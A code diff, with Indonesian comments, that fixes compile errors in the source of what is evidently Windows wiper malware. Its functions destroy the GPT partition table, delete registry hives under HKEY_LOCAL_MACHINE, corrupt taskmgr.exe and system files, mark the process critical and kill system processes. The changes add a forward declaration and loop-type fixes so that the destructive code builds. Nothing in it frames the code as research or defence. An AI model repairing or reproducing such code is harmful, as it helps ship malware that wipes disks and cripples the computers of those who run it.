@@ -160,6 +160,7 @@ void DestroyGPT() {
     CloseHandle(hDrive);
 }
 
+// PERBAIKAN 1: Mengganti tipe loop menjadi size_t
 void DestroyRegistry() {
     const wchar_t* registryKeys[] = {
         L"HKEY_LOCAL_MACHINE\\SOFTWARE",
@@ -173,7 +174,6 @@ void DestroyRegistry() {
     };
 
     for (size_t i = 0; i < sizeof(registryKeys)/sizeof(registryKeys[0]); i++) {
-        
         HKEY hKey;
         wchar_t subKey[256];
         wchar_t rootKey[256];
@@ -259,6 +259,10 @@ void SetCriticalProcess() {
     }
 }
 
+// PERBAIKAN 2: Deklarasi fungsi sebelum digunakan
+void KillCriticalProcesses();
+
+// PERBAIKAN 1: Mengganti tipe loop menjadi size_t
 void BreakTaskManager() {
     // Corrupt taskmgr.exe
     const wchar_t* taskmgrPaths[] = {
@@ -266,7 +270,7 @@ void BreakTaskManager() {
         L"C:\\Windows\\SysWOW64\\taskmgr.exe"
     };
 
-   for (size_t i = 0; i < sizeof(taskmgrPaths)/sizeof(taskmgrPaths[0]); i++) {
+    for (size_t i = 0; i < sizeof(taskmgrPaths)/sizeof(taskmgrPaths[0]); i++) {
         HANDLE hFile = CreateFileW(taskmgrPaths[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
         if (hFile != INVALID_HANDLE_VALUE) {
             DWORD fileSize = GetFileSize(hFile, NULL);
@@ -286,7 +290,7 @@ void BreakTaskManager() {
     }
 
     // Kill existing task manager processes
-    KillCriticalProcesses();
+    KillCriticalProcesses(); // PERBAIKAN 2: Panggil fungsi yang sudah dideklarasikan
 }
 
 // ======== FUNGSI SUARA & EFEK VISUAL ========
@@ -849,6 +853,7 @@ void CorruptSystemFiles() {
     fileCorruptionActive = true;
 }
 
+// PERBAIKAN 2: Fungsi dipindahkan sebelum BreakTaskManager
 void KillCriticalProcesses() {
     const wchar_t* targets[] = {
         L"taskmgr.exe",
